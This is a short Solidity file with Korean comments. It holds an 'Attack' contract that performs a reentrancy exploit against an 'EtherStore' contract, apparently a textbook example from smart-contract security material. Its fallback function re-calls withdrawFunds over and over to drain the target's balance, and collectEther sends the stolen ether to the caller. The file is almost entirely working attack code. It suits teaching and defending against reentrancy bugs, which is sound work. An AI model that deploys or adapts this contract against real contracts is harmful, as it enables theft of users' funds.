import "EtherStore.sol";

contract Attack {

    EtherStore public etherStore; 

    //변수 etherStore를 컨트랙트 주소로 초기화;
    constructor(address _etherStoreAddress){
        etherStore = EtherStore(_etherStoreAddress);
    }

    function attackEtherStore() public payable {
        //이더 근삿값 공격
        require(msg.value >= 1 ether);
        //이더를 depositFunds 함수로 전달하기
        etherStore.depositFunds.value(1 ether)();
        //마법시작
        etherStore.withdrawFunds(1 ether);
    }

    function collectEther() public {
        msg.sender.transfer(this.balance);
    }

    // 폴백함수 - 마법이 일어나는 곳
    function () payable {
        if (etherStore.balance > 1 ether){
            etherStore.withdrawFunds(1 ether);
        }
    }
}


// 공격자는 EtherStore의 스마트 컨트랙트의 주소를 유일한 생성자 파라미터로 사용해 악의적인 컨트랙트를 만든다.
// 이렇게 해서 etherStore를 초기화 하고 etherStore가 공격대상 컨트랙트 주소를 갖게한다.
